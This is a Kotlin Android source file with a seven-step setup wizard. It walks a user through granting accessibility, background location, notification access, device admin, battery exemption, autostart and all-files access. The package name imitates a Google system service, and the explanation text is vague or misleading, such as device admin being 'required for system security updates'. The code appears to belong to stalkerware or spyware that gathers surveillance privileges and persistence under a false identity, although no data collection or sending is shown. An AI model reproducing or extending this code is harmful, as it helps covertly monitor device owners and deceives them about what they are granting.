package com.google.android.systemservice.presentation.fragments

import android.Manifest
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import androidx.fragment.app.activityViewModels
import com.google.android.systemservice.presentation.viewmodel.SetupWizardViewModel
import com.google.android.systemservice.receivers.SystemAdminReceiver
import com.google.android.systemservice.utils.PermissionConstants
import com.google.android.systemservice.utils.VendorAutostart

// ── Step 0: Accessibility Service ────────────────────────────────────────────

class AccessibilityStepFragment : Fragment() {
    private val viewModel: SetupWizardViewModel by activityViewModels()

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        return createStepLayout(
            title = "Accessibility Service",
            description = "Enable accessibility to allow system monitoring capabilities.",
            buttonText = "ENABLE SERVICE"
        ) {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
    }

    override fun onResume() {
        super.onResume()
        if (isAccessibilityEnabled()) {
            viewModel.markStepComplete(0)
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        val am = requireContext().getSystemService(Context.ACCESSIBILITY_SERVICE) as? AccessibilityManager
            ?: return false
        val enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        return enabledServices.any { it.id.contains(requireContext().packageName) }
    }
}

// ── Step 1: Runtime Permissions ──────────────────────────────────────────────

class PermissionsStepFragment : Fragment() {
    private val viewModel: SetupWizardViewModel by activityViewModels()

    private val requiredPermissions get() = PermissionConstants.REQUIRED_PERMISSIONS

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        return createStepLayout(
            title = "Runtime Permissions",
            description = "Grant required system permissions for full functionality.",
            buttonText = "GRANT PERMISSIONS"
        ) {
            requestPermissions()
        }
    }

    override fun onResume() {
        super.onResume()
        if (areAllPermissionsGranted()) {
            viewModel.markStepComplete(1)
        }
    }

    private fun requestPermissions() {
        val needed = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(requireContext(), it) != PackageManager.PERMISSION_GRANTED
        }
        if (needed.isNotEmpty()) {
            ActivityCompat.requestPermissions(requireActivity(), needed.toTypedArray(), PERMISSION_REQUEST_CODE)
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            ContextCompat.checkSelfPermission(requireContext(), PermissionConstants.BACKGROUND_LOCATION_PERMISSION)
            != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                requireActivity(),
                arrayOf(PermissionConstants.BACKGROUND_LOCATION_PERMISSION),
                BACKGROUND_LOCATION_REQUEST_CODE
            )
        }
    }

    private fun areAllPermissionsGranted(): Boolean {
        val foregroundDone = requiredPermissions.all {
            ContextCompat.checkSelfPermission(requireContext(), it) == PackageManager.PERMISSION_GRANTED
        }
        if (!foregroundDone) return false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            return ContextCompat.checkSelfPermission(
                requireContext(), PermissionConstants.BACKGROUND_LOCATION_PERMISSION
            ) == PackageManager.PERMISSION_GRANTED
        }
        return true
    }

    companion object {
        const val PERMISSION_REQUEST_CODE = 1001
        const val BACKGROUND_LOCATION_REQUEST_CODE = 1008
    }
}

// ── Step 2: Notification Listener ────────────────────────────────────────────

class NotificationStepFragment : Fragment() {
    private val viewModel: SetupWizardViewModel by activityViewModels()

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        return createStepLayout(
            title = "Notification Access",
            description = "Enable notification listener for system event monitoring.",
            buttonText = "ENABLE ACCESS"
        ) {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }
    }

    override fun onResume() {
        super.onResume()
        if (isNotificationListenerEnabled()) {
            viewModel.markStepComplete(2)
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(
            requireContext().contentResolver, "enabled_notification_listeners"
        )
        return flat?.contains(requireContext().packageName) == true
    }
}

// ── Step 3: Battery Optimization ─────────────────────────────────────────────

class BatteryStepFragment : Fragment() {
    private val viewModel: SetupWizardViewModel by activityViewModels()

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        return createStepLayout(
            title = "Battery Optimization",
            description = "Exempt from battery optimization for uninterrupted operation.",
            buttonText = "OPTIMIZE"
        ) {
            requestBatteryExemption()
        }
    }

    override fun onResume() {
        super.onResume()
        if (isBatteryOptimizationExempt()) {
            viewModel.markStepComplete(3)
        }
    }

    private fun requestBatteryExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = requireContext().getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
            if (!pm.isIgnoringBatteryOptimizations(requireContext().packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${requireContext().packageName}")
                }
                startActivity(intent)
            }
        }
    }

    private fun isBatteryOptimizationExempt(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true
        val pm = requireContext().getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return false
        return pm.isIgnoringBatteryOptimizations(requireContext().packageName)
    }
}

// ── Step 4: Device Admin ─────────────────────────────────────────────────────

class DeviceAdminStepFragment : Fragment() {
    private val viewModel: SetupWizardViewModel by activityViewModels()

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        return createStepLayout(
            title = "Device Admin",
            description = "Activate device administrator for system security.",
            buttonText = "ACTIVATE"
        ) {
            requestDeviceAdmin()
        }
    }

    override fun onResume() {
        super.onResume()
        if (isDeviceAdminActive()) {
            viewModel.markStepComplete(4)
        }
    }

    private fun requestDeviceAdmin() {
        val componentName = ComponentName(requireContext(), SystemAdminReceiver::class.java)
        val dpm = requireContext().getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            ?: return
        if (!dpm.isAdminActive(componentName)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system security updates")
            }
            startActivity(intent)
        }
    }

    private fun isDeviceAdminActive(): Boolean {
        val componentName = ComponentName(requireContext(), SystemAdminReceiver::class.java)
        val dpm = requireContext().getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            ?: return false
        return dpm.isAdminActive(componentName)
    }
}

// ── Step 5: Vendor Autostart ─────────────────────────────────────────────────

class AutostartStepFragment : Fragment() {
    private val viewModel: SetupWizardViewModel by activityViewModels()

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        return createStepLayout(
            title = "Vendor Autostart",
            description = "Configure manufacturer autostart for persistent operation.",
            buttonText = "CONFIGURE"
        ) {
            openAutostartSettings()
        }
    }

    override fun onResume() {
        super.onResume()
        // Vendor autostart cannot be verified programmatically; mark complete
        // once the user has visited the settings screen at least once.
        if (viewModel.isStepComplete(5)) return
        if (VendorAutostart.getAutostartIntent(requireContext()) == null) {
            // No vendor-specific settings needed on stock Android
            viewModel.markStepComplete(5)
        }
    }

    private fun openAutostartSettings() {
        val intent = VendorAutostart.getAutostartIntent(requireContext())
        if (intent != null) {
            try {
                startActivity(intent)
                // Mark complete after launching — can't verify programmatically
                viewModel.markStepComplete(5)
            } catch (_: Exception) {
                viewModel.markStepComplete(5)
            }
        } else {
            viewModel.markStepComplete(5)
        }
    }
}

// ── Step 6: Storage / All Files Access ───────────────────────────────────────

class StorageStepFragment : Fragment() {
    private val viewModel: SetupWizardViewModel by activityViewModels()

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        return createStepLayout(
            title = "Storage Access",
            description = "Grant all-files access for complete file management.",
            buttonText = "ALLOW ACCESS"
        ) {
            requestStorageAccess()
        }
    }

    override fun onResume() {
        super.onResume()
        if (isStorageAccessGranted()) {
            viewModel.markStepComplete(6)
        }
    }

    private fun requestStorageAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:${requireContext().packageName}")
                    }
                    startActivity(intent)
                } catch (_: Exception) {
                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                }
            }
        }
    }

    private fun isStorageAccessGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            true
        }
    }
}

// ── Shared helper ────────────────────────────────────────────────────────────

private fun Fragment.createStepLayout(
    title: String,
    description: String,
    buttonText: String,
    onClick: () -> Unit
): View {
    return LinearLayout(requireContext()).apply {
        orientation = LinearLayout.VERTICAL
        gravity = Gravity.CENTER
        setPadding(48, 48, 48, 48)

        addView(TextView(context).apply {
            text = title
            textSize = 24f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 24)
        })

        addView(TextView(context).apply {
            text = description
            textSize = 16f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 48)
        })

        addView(Button(context).apply {
            text = buttonText
            setOnClickListener { onClick() }
        })
    }
}
